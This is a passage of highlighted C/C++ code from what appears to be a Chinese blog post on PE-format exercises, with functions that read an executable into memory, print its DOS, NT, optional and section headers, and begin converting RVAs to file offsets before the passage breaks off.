class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br><span class=\"line\">795</span><br><span class=\"line\">796</span><br><span class=\"line\">797</span><br><span class=\"line\">798</span><br><span class=\"line\">799</span><br><span class=\"line\">800</span><br><span class=\"line\">801</span><br><span class=\"line\">802</span><br><span class=\"line\">803</span><br><span class=\"line\">804</span><br><span class=\"line\">805</span><br><span class=\"line\">806</span><br><span class=\"line\">807</span><br><span class=\"line\">808</span><br><span class=\"line\">809</span><br><span class=\"line\">810</span><br><span class=\"line\">811</span><br><span class=\"line\">812</span><br><span class=\"line\">813</span><br><span class=\"line\">814</span><br><span class=\"line\">815</span><br><span class=\"line\">816</span><br><span class=\"line\">817</span><br><span class=\"line\">818</span><br><span class=\"line\">819</span><br><span class=\"line\">820</span><br><span class=\"line\">821</span><br><span class=\"line\">822</span><br><span class=\"line\">823</span><br><span class=\"line\">824</span><br><span class=\"line\">825</span><br><span class=\"line\">826</span><br><span class=\"line\">827</span><br><span class=\"line\">828</span><br><span class=\"line\">829</span><br><span class=\"line\">830</span><br><span class=\"line\">831</span><br><span class=\"line\">832</span><br><span class=\"line\">833</span><br><span class=\"line\">834</span><br><span class=\"line\">835</span><br><span class=\"line\">836</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//关于节表的所有实验：</span></span><br><span class=\"line\"><span class=\"comment\">//千万不要做黑盒!!!</span></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">ReadPEFile</span><span class=\"params\">(IN LPSTR lpszFile, OUT LPVOID* pFileBuffer)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tFILE* fp;</span><br><span class=\"line\">\tfp = <span class=\"built_in\">fopen</span>((LPSTR)lpszFile, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(fp == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">fseek</span>(fp,<span class=\"number\">0</span>,SEEK_END);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//获得文件指针长度</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> len = <span class=\"built_in\">ftell</span>(fp);  </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">fseek</span>(fp,<span class=\"number\">0</span>,SEEK_SET);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//开辟堆区</span></span><br><span class=\"line\">\tLPVOID ptr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tptr = (LPVOID)<span class=\"built_in\">malloc</span>(len);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ptr == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout&lt;&lt; <span class=\"string\">&quot;ptr == NULL&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">\t\t<span class=\"built_in\">fclose</span>(fp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(ptr,<span class=\"number\">0</span>,len);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//读文件</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> reader = <span class=\"built_in\">fread</span>(ptr,len,<span class=\"number\">1</span>,fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(reader == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout&lt;&lt; <span class=\"string\">&quot;reader == NULL&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">\t\t<span class=\"built_in\">fclose</span>(fp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//传出参数复制</span></span><br><span class=\"line\">\t*pFileBuffer = ptr;</span><br><span class=\"line\">\tptr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">fclose</span>(fp);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> len;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ResolvePEHeader</span><span class=\"params\">(IN LPVOID pFileBuffer)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pFileBuffer == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pFileBuffer == NULL\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//定义PE结构</span></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//判断MZ标记</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*(PWORD)pDosHeader != IMAGE_DOS_SIGNATURE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;not a valid mz signature\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;valid mz signature\\n&quot;);</span></span><br><span class=\"line\">\t<span class=\"comment\">//DOS头</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------DOS header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;DOS header: e_magic=%X\\n&quot;</span>,pDosHeader-&gt;e_magic);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;DOS header: e_lfanew=%X\\n&quot;</span>,pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//NT header\t</span></span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------NT header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NT header: Signature=%X\\n&quot;</span>,pNTHeader-&gt;Signature);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//file header</span></span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------File header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: Machine=%X\\n&quot;</span>,pFileHeader-&gt;Machine);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: NumberOfSections=%X\\n&quot;</span>,pFileHeader-&gt;NumberOfSections);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: TimeDateStamp=%X\\n&quot;</span>,pFileHeader-&gt;TimeDateStamp);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: SizeOfOptionalHeader=%X\\n&quot;</span>,pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: Characteristics=%X\\n&quot;</span>,pFileHeader-&gt;Characteristics);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//optional header</span></span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------Optional header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: Magic=%X\\n&quot;</span>,pOptionHeader-&gt;Magic);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SizeOfCode=%X\\n&quot;</span>,pOptionHeader-&gt;SizeOfCode);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: AddressOfEntryPoint=%X\\n&quot;</span>,pOptionHeader-&gt;AddressOfEntryPoint);\t</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: BaseOfCode=%X\\n&quot;</span>,pOptionHeader-&gt;BaseOfCode);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: BaseOfData=%X\\n&quot;</span>,pOptionHeader-&gt;BaseOfData);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: ImageBase=%X\\n&quot;</span>,pOptionHeader-&gt;ImageBase);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SectionAlignment=%X\\n&quot;</span>,pOptionHeader-&gt;SectionAlignment);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: FileAlignment=%X\\n&quot;</span>,pOptionHeader-&gt;FileAlignment);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SizeOfImage=%X\\n&quot;</span>,pOptionHeader-&gt;SizeOfImage);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SizeOfHeaders=%X\\n&quot;</span>,pOptionHeader-&gt;SizeOfHeaders);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: CheckSum=%X\\n&quot;</span>,pOptionHeader-&gt;CheckSum);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//section header</span></span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(pFileHeader-&gt;NumberOfSections &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//防止在name=8个字符时产生越界</span></span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> name[<span class=\"number\">9</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">8</span>;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tname[i] = pSectionHeader-&gt;Name[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//section header print</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------SECTION_HEADER---------\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: Name=%s\\n&quot;</span>, name);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: Misc=%X\\n&quot;</span>, pSectionHeader-&gt;Misc);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: VirtualAddress=%X\\n&quot;</span>, pSectionHeader-&gt;VirtualAddress);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: SizeOfRawData=%X\\n&quot;</span>, pSectionHeader-&gt;SizeOfRawData);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: PointerToRawData=%X\\n&quot;</span>, pSectionHeader-&gt;PointerToRawData);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: Characteristics=%X\\n&quot;</span>, pSectionHeader-&gt;Characteristics);</span><br><span class=\"line\">\t\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\">\t\tpFileHeader-&gt;NumberOfSections--;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">RvaToFileOffset</span><span class=\"params\">(IN LPVOID pFileBuffer, DWORD dwRva)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//define pe structure</span></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionTemp = pSectionHeader;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwRva &lt;= pOptionHeader-&gt;SizeOfHeaders)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (DWORD)dwRva;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> n = <span class=\"number\">0</span>; n &lt; pFileHeader-&gt;NumberOfSections; n++, pSectionTemp++)</span><br><span class=\"line\">\t\t&#123;\t<span class=\"comment\">//判断 :   文件对齐+文件偏移&gt;file_panyi&gt;文件偏移  (即是在文件的哪个节中)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> ((dwRva &gt;= pSectionTemp-&gt;VirtualAddress) &amp;&amp; (dwRva &lt; pSectionTemp-&gt;VirtualAddress + pSectionTemp-&gt;Misc.VirtualSize))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> dwRva - pSectionTemp-&gt;VirtualAddress + pSectionTemp-&gt;PointerToRawData;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 1</span></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;pFileBuffer: %X\\n&quot;, pFileBuffer); //450068</span></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;DWRVA: %X\\n&quot;, dwRva); </span></span><br><span class=\"line\">\t<span class=\"comment\">//DWORD MemOffset = (dwRva - (DWORD)pImageBuffer); //45C29C - 450068 = C234，内存中的rva</span></span><br><span class=\"line\">\tDWORD MemOffset = (dwRva);</span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;MemOffset: %X\\n&quot;, MemOffset); </span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//当前RVA在哪个节中</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> NumOfSec = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//RVA所在节的VirtualAddress</span></span><br><span class=\"line\">\tDWORD thisVA = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//RVA所在节的PointerToRawData</span></span><br><span class=\"line\">\tDWORD thisFile = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//距离当前节开始的便宜</span></span><br><span class=\"line\">\tDWORD thisoffset = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//在文件中的FOA</span></span><br><span class=\"line\">\tDWORD FilePos = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//判断在哪个节的条件</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (pFileHeader-&gt;NumberOfSections &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((DWORD)MemOffset 